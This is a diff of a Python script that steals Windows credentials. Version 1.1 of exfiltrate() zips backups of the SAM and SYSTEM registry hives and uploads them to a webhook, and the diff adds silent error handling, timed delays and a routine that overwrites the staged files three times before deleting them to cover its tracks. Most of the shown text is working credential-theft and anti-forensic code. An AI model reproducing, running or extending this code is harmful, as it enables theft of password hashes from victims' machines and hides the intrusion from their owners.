@@ -1,5 +1,5 @@
 # Author:  mrpanda_bamboo
-# Version: 1.0
+# Version: 1.1
 # License: MIT
 
 import os
@@ -20,9 +20,28 @@ def is_admin():
     except:
         return False
 
+def secure_delete_file(file_path):
+    try:
+        file_size = os.path.getsize(file_path)
+        with open(file_path, 'r+b', buffering=0) as f:
+            for _ in range(3):
+                f.seek(0)
+                f.write(os.urandom(file_size))
+                f.flush()
+                os.fsync(f.fileno())
+        os.remove(file_path)
+    except Exception:
+        try:
+            os.remove(file_path)
+        except Exception:
+            pass
+
 def send_file(file_path):
-    with open(file_path, 'rb') as f:
-        requests.post(WEBHOOK_URL, files={'file': f}, timeout=60)
+    try:
+        with open(file_path, 'rb') as f:
+            requests.post(WEBHOOK_URL, files={'file': f}, timeout=60)
+    except Exception:
+        pass
 
 def exfiltrate():
     if os.path.exists(WORKING_DIR):
@@ -43,11 +62,37 @@ def exfiltrate():
         with zipfile.ZipFile(sam_zip, 'w', zipfile.ZIP_DEFLATED) as z:
             z.write(sam_bak, "SAM")
         send_file(sam_zip)
+        time.sleep(3)
 
     if os.path.exists(sys_bak):
         with zipfile.ZipFile(sys_zip, 'w', zipfile.ZIP_DEFLATED) as z:
             z.write(sys_bak, "SYSTEM")
         send_file(sys_zip)
+        time.sleep(3)
+
+    time.sleep(10)
+    
+    for attempt in range(3):
+        try:
+            for root, dirs, files in os.walk(WORKING_DIR, topdown=False):
+                for file in files:
+                    secure_delete_file(os.path.join(root, file))
+                for dir_name in dirs:
+                    try:
+                        os.rmdir(os.path.join(root, dir_name))
+                    except Exception:
+                        pass
+            os.rmdir(WORKING_DIR)
+            break
+        except Exception:
+            if attempt < 2:
+                time.sleep(2)
+    
+    try:
+        time.sleep(5)
+        shutil.rmtree(WORKING_DIR, ignore_errors=True)
+    except Exception:
+        pass
 
 if __name__ == "__main__":
     if is_admin():
